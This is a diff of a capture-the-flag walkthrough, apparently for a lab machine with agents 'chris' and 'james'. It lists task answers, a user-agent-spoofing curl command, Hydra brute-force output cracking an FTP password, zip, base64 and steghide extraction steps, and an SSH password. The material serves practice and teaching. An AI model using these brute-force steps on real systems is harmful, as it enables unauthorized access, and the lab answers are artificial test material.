@@ -5,6 +5,7 @@
 Deploy
 
 ***TASK2***
+```
 1.How many open ports?
 :3
 
@@ -14,12 +15,13 @@ Deploy
 3.What is the agent name?
 :chris
 
-use command)
+use command?
 curl "{ip}" -H "user-agent:c" -L
-
+```
 
 ***TASK3***
 1.FTP Password
+
 ```
 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
 
@@ -30,9 +32,9 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-02 14:31:
 [21][ftp] host: 10.10.167.223   login: chris   password: crystal
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-02 14:33:52
-```
-:crystal
 
+:crystal
+```
 
 2.Zip file password
 ```
@@ -47,19 +49,19 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-02 14:33:
 ```
 : 7z e 8702.zip
 : cat  base64msg | base64 -d
-```
 :Area51
-
+```
 
 4.Who is the other agent ( in full name)?
 ```
 : steghide extract -sf cute-alien.jpg
-```
 : james
+```
 
 5.SSh password
+```
 :hackerrules!
-
+```
 ***TASK4: Capture the user flag***
 
 
